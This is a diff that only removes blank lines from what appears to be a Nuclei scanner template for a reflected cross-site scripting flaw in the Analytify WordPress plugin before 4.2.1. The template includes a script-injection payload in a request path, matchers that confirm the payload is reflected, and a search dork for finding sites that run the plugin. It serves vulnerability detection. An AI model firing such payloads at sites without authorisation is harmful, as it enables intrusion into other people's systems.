@@ -1,5 +1,4 @@
 id: analytify-plugin-xss
-
 info:
   name: Analytify < 4.2.1 - Cross-Site Scripting
   author: Akincibor
@@ -12,12 +11,10 @@ info:
     verified: true
     google-dork: inurl:/wp-content/plugins/wp-analytify
   tags: wp-plugin,xss,wp,wordpress,analytify
-
 requests:
   - method: GET
     path:
       - '{{BaseURL}}/aa404bb?a</script><script>alert(/XSS/)</script>'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -26,12 +23,10 @@ requests:
           - 'text/javascript">alert(/XSS/)</script>'
           - 'wp-analytify'
         condition: and
-
       - type: word
         part: header
         words:
           - text/html
-
       - type: status
         status:
           - 404
